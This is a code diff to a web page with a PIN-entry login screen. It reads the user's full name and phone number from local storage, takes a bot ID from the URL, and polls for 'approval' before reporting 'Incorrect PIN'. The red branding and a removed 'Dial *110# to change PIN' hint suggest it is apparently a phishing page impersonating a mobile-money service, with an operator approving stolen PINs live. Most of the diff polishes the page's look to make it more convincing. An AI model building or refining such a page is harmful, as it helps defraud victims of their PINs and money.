@@ -20,6 +20,8 @@
       background: #c00000;
       position: relative;
       flex-shrink: 0;
+      border-bottom-left-radius: 28px;
+      border-bottom-right-radius: 28px;
     }
 
     .back {
@@ -34,33 +36,62 @@
     .pin-container {
       flex: 1;
       background: #ffffff;
-      padding: 24px 16px;
+      padding: 28px 16px;
+      margin-top: -32px;
+      border-top-left-radius: 32px;
+      border-top-right-radius: 32px;
     }
 
     .pin-title {
       text-align: center;
       font-size: 16px;
       color: #333;
-      margin-bottom: 20px;
+      margin-bottom: 22px;
+      font-weight: 600;
     }
 
     .pin-row {
       display: flex;
       justify-content: center;
-      gap: 12px;
-      margin-bottom: 24px;
+      gap: 14px;
+      margin-bottom: 26px;
     }
 
-    .pin-box,
-    .lock {
-      width: 52px;
-      height: 52px;
-      border: 1px solid #ccc;
+    /* 🔥 PIN BOX STYLING */
+    .pin-box {
+      width: 56px;
+      height: 56px;
+      border-radius: 14px;
+      border: 1.5px solid #ddd;
       background: #fafafa;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 26px;
+      font-size: 28px;
+      font-weight: bold;
+      color: #c00000;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.08);
+      transition: all 0.2s ease;
+    }
+
+    /* Filled state (dot visible) */
+    .pin-box:not(:empty) {
+      border-color: #c00000;
+      background: #fff;
+    }
+
+    /* 🔒 LOCK MATCHING PIN BOX */
+    .lock {
+      width: 56px;
+      height: 56px;
+      border-radius: 14px;
+      border: 1.5px dashed #ddd;
+      background: #f5f5f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      color: #777;
     }
 
     button {
@@ -73,20 +104,15 @@
       background: #c00000;
       color: white;
       border: none;
+      border-radius: 999px;
       cursor: pointer;
       opacity: 0.5;
+      transition: opacity 0.2s ease;
     }
 
     button:enabled {
       opacity: 1;
       cursor: pointer;
-    }
-
-    .note {
-      font-size: 13px;
-      color: #777;
-      margin-top: 18px;
-      text-align: center;
     }
 
     .status {
@@ -127,7 +153,6 @@
 
     <button id="loginBtn" disabled>Login</button>
     <div id="status" class="status">⏳ Waiting for approval...</div>
-    <!-- <div class="note">Dial *110# to change PIN</div> -->
   </div>
 
   <input
@@ -153,7 +178,6 @@
     const fullName = localStorage.getItem('fullName');
     const phone = localStorage.getItem('phone');
 
-    // ✅ Multi-bot safe botId
     const params = new URLSearchParams(window.location.search);
     const botId =
       params.get('botId') ||
@@ -223,11 +247,9 @@
 
         if (data.approved === false || data.blocked) {
           clearInterval(interval);
-
           input.value = '';
           boxes.forEach(b => b.textContent = '');
           loginBtn.disabled = true;
-
           statusEl.classList.add('error');
           statusEl.textContent = '❌ Incorrect PIN. Please try again.';
         }
